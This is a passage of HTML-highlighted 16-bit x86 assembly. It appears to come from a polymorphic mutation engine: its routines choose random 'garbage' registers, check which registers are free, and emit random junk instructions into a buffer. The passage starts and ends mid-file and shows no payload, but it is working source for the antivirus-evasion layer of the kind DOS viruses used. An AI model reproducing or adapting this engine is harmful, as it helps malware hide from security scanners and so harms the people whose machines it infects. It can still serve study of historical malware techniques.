        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">     </span><span class="sc1">; mask low nibble</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">       </span><span class="sc1">; high nibble means lenght?</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">skip_this_entry</span><span class="sc0"> </span><span class="sc1">; don't use variable lenght entries</span><span class="sc0">

        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">       </span><span class="sc1">; push away lower nibble</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">      </span><span class="sc1">; al has compatibility info</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">skip_this_entry</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">      </span><span class="sc1">; if compatible count this</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">end_table_ff_check</span><span class="sc0">

</span><span class="sc5">skip_this_entry</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">move_through_table</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">          </span><span class="sc1">; skip entry</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">loop_search_compat</span><span class="sc0">



</span><span class="sc5">check_reg_compatibility</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc1">; checks if the garbage register is compatible with the used regs</span><span class="sc0">
</span><span class="sc1">; returns flags to confirm. Z ok, NZ not ok</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_word_byte</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">rc_check_bytesize</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; check the right bit</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">register_compat</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">rc_exitrout</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">rc_check_bytesize</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">register_compat</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">rc_exitrout</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">           </span><span class="sc1">; if &lt; must check 8bit aswell</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">  </span><span class="sc5">gewd_regcomp_exit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">          </span><span class="sc1">; check both 8bits regs</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">register_compat</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">gewd_regcomp_exit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">using_8_bits_register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">gewd_regcomp_exit</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">          </span><span class="sc1">; just set the Z flag</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">rc_exitrout</span><span class="sc0">


</span><span class="sc1">; put a register that has been already initialized in bl</span><span class="sc0">
</span><span class="sc5">get_a_reg_in_bl_usable</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
</span><span class="sc5">find_areg_usable</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">              </span><span class="sc1">; get a reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">               </span><span class="sc1">; its coding</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_word_byte</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc4">[</span><span class="sc8">si</span><span class="sc4">+</span><span class="sc5">register_compat</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">    </span><span class="sc1">; ok if already used</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">find_areg_usable</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">cl</span><span class="sc0">              </span><span class="sc1">; return in bl</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; creates many types of instructions depending on the given data byte. the</span><span class="sc0">
</span><span class="sc1">; instructions can either have registers as source and destionation or can</span><span class="sc0">
</span><span class="sc1">; have a memory reference (also with registers used as pointer) as the source.</span><span class="sc0">
</span><span class="sc5">routines_various_memoff_or_rr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">using_8_bits_register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">come_home_rout</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">check_reg_compatibility</span><span class="sc0"> </span><span class="sc1">; with reg or without?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">dontuse_grbreg</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_word_byte</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">bx</span><span class="sc4">+</span><span class="sc5">register_compat</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">    </span><span class="sc1">; no regs used?</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">come_home_rout</span><span class="sc0">

        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_word_byte</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_a_reg_in_bl_usable</span><span class="sc0">  </span><span class="sc1">; get an initialized reg</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_register</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; dest</span><span class="sc0">

        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; reg * 8, src</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">          </span><span class="sc1">; make it with that reg</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">; store</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">dontuse_grbreg</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">               </span><span class="sc1">; get the data byte</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_word_byte</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FF14h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">    </span><span class="sc1">; here we select some random</span><span class="sc0">
                        </span><span class="sc1">; reg/regs to be used as pnt</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C7h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_register</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; reg * 8, this is the dest</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc0">          </span><span class="sc1">; make it with that reg</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">               </span><span class="sc1">; store</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc0">         </span><span class="sc1">; see which kind of op has</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">requires_a_byte</span><span class="sc0">     </span><span class="sc1">; been generated and put some</span><span class="sc0">
                        </span><span class="sc1">; more bytes if needed. this</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">         </span><span class="sc1">; bytes should be memory</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">requires_a_word</span><span class="sc0">     </span><span class="sc1">; offsets (ie. [bx+123])</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">come_home_rout</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">bl</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">requires_a_word</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">di</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">come_home_rout</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc5">requires_a_word</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9E6Ah</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">not_zero_hh</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
</span><span class="sc5">not_zero_hh</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">come_home_rout</span><span class="sc0">


</span><span class="sc5">requires_a_byte</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">       </span><span class="sc1">; zero not allowed</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">not_zero_hhh</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc5">not_zero_hhh</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">come_home_rout</span><span class="sc0">

</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; copies one byte from the data bytes of the entry and then puts an</span><span class="sc0">
</span><span class="sc1">; immediate after it (word or byte depending on [garbage_word_byte]).</span><span class="sc0">
</span><span class="sc1">; this doesn't use the selected garbage register, but rather it uses the</span><span class="sc0">
</span><span class="sc1">; one defined already by the opcode in the table.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">routines_copy_one_plus_imm</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">   </span><span class="sc1">; is ax?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">copi_notusingax</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">using_8_bits_register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">copi_return_fr</span><span class="sc0">

</span><span class="sc5">copi_notusingax</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">register_compat</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">    </span><span class="sc1">; ax used?</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">copi_alnotused</span><span class="sc0">
        </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">register_compat</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">11h</span><span class="sc0">  </span><span class="sc1">; used ah/al</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">copi_return_fr</span><span class="sc0">

</span><span class="sc5">copi_alnotused</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">restrict_grb_ax_is_used</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">copi_return_fr</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C350h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">      </span><span class="sc1">; copy the immediate</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_word_byte</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">copi_byte_dimension</span><span class="sc0">

        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">           </span><span class="sc1">; word dim and store everything</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc9">short</span><span class="sc0"> </span><span class="sc5">copi_return_fr</span><span class="sc0">

</span><span class="sc5">copi_byte_dimension</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FEh</span><span class="sc0">        </span><span class="sc1">; here is byte</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

</span><span class="sc5">copi_return_fr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">


</span><span class="sc1">; creates math instructions that uses an immediate</span><span class="sc0">
</span><span class="sc5">routines_math_with_immediate</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">using_8_bits_register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">man_with_imm_ret</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">; first byte opcode</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_word_byte</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; dimension</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">                   </span><span class="sc1">; ok!</span><span class="sc0">

        </span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">; second byte opcode</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">            </span><span class="sc1">; for math instr</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">  </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_register</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; with grb reg</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EA60h</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random_limit</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">garbage_word_byte</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">man_bytesizer</span><span class="sc0">           </span><span class="sc1">; put the immediate</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">                   </span><span class="sc1">; of correct size</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">man_with_imm_ret</span><span class="sc0">
</span><span class="sc5">man_bytesizer</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc5">man_with_imm_ret</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; uses two opcodes and generates various math instructions (only 16bits)</span><span class="sc0">
</span><span class="sc5">routines_manage_math_twobytes</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">ds</span><span class="sc4">:[</span><span class="sc5">using_8_bits_register</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">  </span><span class="sc5">man_with_imm_ret</span><span class="sc0">

        </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">             </span><span class="sc1">; skip info byte</span><span class="sc0">
        </span><span class="sc6">lodsb</span><span class="sc0">                  </span><span class="sc1">; get first opcode</span><span class="sc0">
